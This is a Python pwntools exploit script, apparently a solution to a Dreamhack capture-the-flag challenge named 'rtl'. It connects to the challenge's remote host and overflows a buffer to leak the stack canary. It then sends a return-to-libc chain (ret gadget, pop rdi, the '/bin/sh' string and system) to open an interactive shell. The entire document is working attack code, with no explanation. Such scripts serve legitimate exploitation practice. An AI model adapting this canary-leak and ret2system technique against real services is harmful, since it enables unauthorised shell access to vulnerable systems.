from pwn import *

exe = ELF("./rtl")
r = remote("host3.dreamhack.games", 15274)
# r = process(exe.path)
# gdb.attach(r, gdbscript='''
#            b*main+145
#            c
#            ''')
input()
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b"a"*57
r.sendafter(b"Buf: ", payload)
r.recvuntil(b"a" * 56)
canary = u64(r.recv(8))
canary = canary - 0x61
log.info("canary: " + hex(canary))

payload = b"a" * 56 + p64(canary)
payload += b"a" * 8 + p64(ret) + p64(pop_rdi)
payload += p64(next(exe.search(b'/bin/sh'))) + p64(exe.sym["system"])
r.sendafter(b"Buf: ", payload)

r.interactive()
